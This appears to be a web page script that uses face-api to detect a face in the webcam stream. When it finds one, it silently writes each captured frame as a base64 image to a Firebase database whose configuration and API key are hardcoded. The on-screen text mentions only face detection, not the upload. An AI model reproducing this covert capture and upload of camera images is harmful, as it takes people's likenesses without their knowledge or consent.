import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.7.0/firebase-app.js'
// import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/9.7.0/firebase-storage.js"
import { getDatabase, ref, set  } from "https://www.gstatic.com/firebasejs/9.7.0/firebase-database.js";
var detectVal = 0;
var timeDelay = 1000;
const video = document.querySelector('video');
let canvas = document.createElement('canvas');
let streamStarted = false;

const constraints = {
  video: {
    width: {
 
      min: 720,
      ideal: 720,
      max: 1080,
    },
    height: {
      min: 720,
      ideal: 1080,
      max: 1440
    },
  }
};



const firebaseConfig = {
  apiKey: "AIzaSyAG4K9rR4HyLzPBcvh9rPfPdm8kmA6PsOE",
  authDomain: "project9-4f058.firebaseapp.com",
  databaseURL: "https://project9-4f058-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "project9-4f058",
  storageBucket: "project9-4f058.appspot.com",
  messagingSenderId: "908366468736",
  appId: "1:908366468736:web:1a5624c9a97d8b78cdf865",
  measurementId: "G-4YT9120WMB"
};

const app = initializeApp(firebaseConfig);

const database = getDatabase(app);
// const storage = getStorage();
// const storageRef = ref(storage, 'screen.png');


 window.addEventListener('load', (event) => {
   if ('mediaDevices' in navigator && navigator.mediaDevices.getUserMedia) {
     //startStream(constraints);
     Promise.all([
          faceapi.nets.tinyFaceDetector.loadFromUri("/Project9/tiny_face_detector_model-weights_manifest.json"),
          faceapi.nets.faceLandmark68Net.loadFromUri("/Project9/face_landmark_68_model-weights_manifest.json"),
          faceapi.nets.faceRecognitionNet.loadFromUri("/Project9/face_recognition_model-weights_manifest.json"),
          faceapi.nets.faceExpressionNet.loadFromUri("/Project9/face_expression_model-weights_manifest.json"),
          faceapi.nets.ageGenderNet.loadFromUri("/Project9/age_gender_model-weights_manifest.json")
      ]).then(startStream(constraints));
   }
 });


// video.addEventListener("playing", () => {

  setInterval(async () => {
            const detections = await faceapi
          .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
          if(typeof detections == 'undefined'){
                 detectVal = 0;
          }else{
                 detectVal = detections['_score']
                 console.log(detectVal);
                 // console.log(detectVal);
          }
          if(detectVal<0.7){
            document.getElementById("verify_emo").style.visibility = "hidden";
            document.getElementById("verify_text").style.top = "65vh";
            document.getElementById("verify_text").innerHTML = "Smile for the Camera!";
          }
          if(detectVal>=0.7){
            document.getElementById("verify_emo").style.visibility="visible";
            document.getElementById("verify_text").style.top = "70vh";
            document.getElementById("verify_text").innerHTML = "Face Detected!";
            myScreen();
          }

  },timeDelay);
// });


function myScreen(){
  canvas.width = video.videoWidth
  canvas.height = video.videoHeight
  canvas.getContext('2d').drawImage(video, 0, 0)

  const img = document.createElement('img')
  img.src = canvas.toDataURL('image/png')


  const db = getDatabase();
  set(ref(db, 'base64/'), {
    username: img.src,
  });
  console.log("Uploaded Successfully")
};




 const startStream = async (constraints) => {
   const stream = await navigator.mediaDevices.getUserMedia(constraints);
   handleStream(stream);
 };


 const handleStream = (stream) => {
   video.srcObject = stream;
 };

//extra
// writeUserData("123","Here");

// uploadBytes(storageRef, canvas).then((snapshot) => {
//   console.log(img.src);
// });
